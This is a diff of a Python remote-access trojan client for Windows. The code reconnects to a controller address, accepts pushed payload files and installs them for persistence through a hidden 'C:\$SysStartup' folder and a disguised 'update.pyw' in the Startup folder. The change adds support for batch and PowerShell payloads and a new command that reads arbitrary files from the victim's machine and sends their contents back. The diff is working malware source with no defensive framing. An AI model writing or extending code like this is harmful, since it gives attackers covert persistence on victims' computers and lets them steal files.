@@ -3,7 +3,8 @@ from subprocess import check_output, call
 from time import sleep
 from sys import exit
 from random import randint
-from os import getlogin, chdir, getcwd
+from os import getlogin, chdir
+from os.path import exists
 import threading
 import pathlib
 
@@ -36,7 +37,6 @@ def connector():
         client.connect(ADDR)
         recvMsg()
     except (ConnectionRefusedError, TimeoutError, OSError):
-        print("retrying in 30 secs")
         sleep(30)
         connector()
 
@@ -77,9 +77,10 @@ def process(message):
     elif ctype == "f":
         # checks what type of file and what mode it uses
         msgNoType = message[1:]
-        mode = msgNoType[4]
+        mode = msgNoType[3]
         msg = message[5:]
         fType = msgNoType[0:3].replace(' ', '')
+        print(fType)
         # generates the name of the file
         name = f"a{randint(100, 900)}.{fType}"
         # writes the file
@@ -88,21 +89,51 @@ def process(message):
         # checks if the script is only temporarry
         if mode == "A":
             # checks if the  the script is installes and returns an error if not
-            if call(["powershell" "Test-path" "-Path" "C:\\$SysStartup\\temp"], shell=True) == "True":
-                call(["move", f"a{name}", "C:/$SysStartup/temp"], shell=True)
+            if exists('C:/$SysStartup/temp'):
+                call(["move", f"{name}", "C:/$SysStartup/temp"], shell=True)
                 with open(f"C:\\Users\\{getlogin()}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\update.pyw", "a") as obj:
-                    if fType == "py" or "pyw":
-                        obj.write(f'{name[0:4]} = lambda: call(["python", f"C:/$SysStartup/temp/{name}"], shell=True)')
-                        obj.write(f'b{name[0:4]} = threading.Thread(target=name[0:4])')
-                        obj.write(f'b{name[0:4]}.start()')
+                    if fType == "pyw":
+                        obj.write(f'def {name[0:4]}(): call(["python", f"C:/$SysStartup/temp/{name}"], shell=True)\n')
+
+                        def thread():
+                            call(["python", f"C:/$SysStartup/temp/{name}"], shell=True)
+
+                        start = threading.Thread(target=thread)
+
+                    elif fType == "bat":
+                        obj.write(f'def {name[0:4]}(): call([f"C:/$SysStartup/temp/{name}"], shell=True)\n')
+
+                        def thread():
+                            call([f"C:/$SysStartup/temp/{name}"], shell=True)
+
+                        start = threading.Thread(target=thread)
+
+                    elif fType == "ps1":
+                        obj.write(f'def {name[0:4]}(): call(["powershell", f"C:/$SysStartup/temp/{name}"], shell=True)\n')
+
+                        def thread():
+                            call(["powershell", f"C:/$SysStartup/temp/{name}"], shell=True)
+
+                        start = threading.Thread(target=thread)
+
+                    obj.write(f'b{name[0:4]} = threading.Thread(target={name[0:4]})\n')
+                    obj.write(f'b{name[0:4]}.start()\n')
+                    start.start()
+
                 sendMsg(name)
             else:
-                call(["remove", name])
                 sendMsg("err")
         else:
             call(["move", name, f"C:\\Users\\{getlogin()}\\AppData\\Local\\Temp"], shell=True)
             sendMsg(name)
     # installation procedure
+    elif ctype == "r":
+        path = message[4:]
+        if exists(path):
+            with open(f"{path}", "r") as retreive:
+                sendMsg(retreive.read())
+        else:
+            sendMsg("err")
     elif ctype == "x":
         # creates the needed folders
         call(["mkdir", "C:\\$SysStartup", "&&", "cd", "C:\\", "&&", "attrib", "+h", "C:\\$SysStartup", "/d", "&&", "mkdir", "C:\\$SysStartup\\temp"], shell=True)
